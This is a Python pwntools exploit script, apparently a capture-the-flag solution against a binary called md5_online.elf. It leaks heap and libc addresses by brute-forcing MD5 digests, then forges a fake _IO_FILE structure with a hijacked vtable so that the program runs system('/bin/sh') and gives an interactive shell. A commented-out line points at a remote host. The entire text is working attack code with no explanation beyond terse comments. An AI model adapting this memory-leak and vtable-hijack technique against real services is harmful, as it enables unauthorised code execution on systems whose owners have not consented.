# encoding: utf-8

from pwn import *

libc = ELF('./libc.so.6')

def DEBUG():
	gdb.attach(r, 'b *free\n')

def get_md5(md5, offset, garbage=''):
	for k in {0x56, 0x57, 0x58, 0xf7, 0xf8, 0xf9}:
		for i in range(0x100):
			for j in range(0x100):
				m = hashlib.md5()
				data = 'a'*offset+chr(i)+chr(j)+chr(k)+garbage
				m.update(data)
				if m.hexdigest() == md5:
					return u32('\x00'+chr(i)+chr(j)+chr(k))
					break
	return -1

r = process(['./ld-2.24.so', '--library-path',  './',  './md5_online.elf'])
gdb.attach(r)
#r = remote('76.74.177.238', 9004)

# leak heap_base
payload = 'a'*0x201
r.sendafter(':', payload)
r.sendlineafter('N]', 'n')
r.recvuntil('MD5: ')
md5 = r.recvline().strip()
heap_base = get_md5(md5, 0x201, '\x61\x01')
print "heap_base @ ", hex(heap_base)

# leak libc_bse
payload = 'a'*0x23d
r.sendafter(':', payload)
r.sendlineafter('N]', 'n')
r.recvuntil('MD5: ')
md5 = r.recvline().strip()
libc_base = get_md5(md5, 0x23d, '\x03')-0x1b6c00
print "libc_base @ ", hex(libc_base)

# get meta data
system = libc_base + libc.symbols['system']
jump = libc_base + libc.symbols['_IO_file_jumps']-0x120
one_gadget = libc_base + 0x3af29
sh = libc_base + libc.search('/bin/sh').next()

# offset to file structure
payload = 'b'.ljust(0x204, '\x01') + flat(0x161)
# fake file structure
fake = p32(0) + flat(0, 0, 0) + flat(0, 1, 0)  + flat(sh, 0) + p32(0)*4 + p32(0) + p32(0) + p32(0)*3 + p32(heap_base+0x2f0)
###### flag ### _IO_read_XXX #### _IO_write_xx ### _IO_buf_xx ## garbage ## _chain # fileno # garbage ## lock 位置 ########  
fake += p32(0)*18  + p32(libc_base + 0x1b4780) + p32(0) + p32(system)
######## garbage  #      vtable                # padding # .fp->s.free_buffer # lock #

payload += fake
r.sendafter(':', payload)
#DEBUG()
r.sendlineafter('N]', 'n')

r.interactive()
